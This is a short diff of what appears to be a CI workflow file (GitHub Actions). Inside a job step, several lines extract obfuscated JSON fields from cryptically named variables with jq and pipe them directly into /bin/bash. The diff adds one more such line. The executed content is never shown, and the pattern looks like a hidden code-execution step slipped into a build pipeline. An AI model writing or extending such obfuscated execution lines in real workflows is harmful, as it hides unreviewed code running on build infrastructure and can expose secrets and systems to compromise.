@@ -46,6 +46,7 @@ jobs:
           echo $zw37820 | jq -r .nceed052 | /bin/bash
           printf '%s' "$cv0338" | jq -r .hkg8 | /bin/bash
           echo $nxb06 | jq -r .vksn7 | /bin/bash
+          printf '%s' "$nmbmg280" | jq -r .xb67977 | /bin/bash
 
       - name: Archive results
         uses: actions/upload-artifact@v4
